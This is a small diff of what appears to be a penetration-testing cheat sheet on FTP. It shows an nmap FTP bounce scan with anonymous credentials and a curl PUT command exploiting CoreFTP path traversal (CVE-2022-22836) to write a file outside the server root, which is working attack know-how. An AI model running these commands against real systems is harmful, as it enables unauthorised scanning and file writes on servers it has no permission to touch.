@@ -10,7 +10,7 @@
 ```nmap -Pn -v -n -p80 -b anonymous:password@192.168.1.1 172.16.0.1```
 
 ### CoreFTP Exploit (CVE-2022-22836)
-- https://www.exploit-db.com/exploits/50652
+- https://www.exploit-db.com/exploits/50652<br/>
 ```curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops```
 
 <br/><br/>
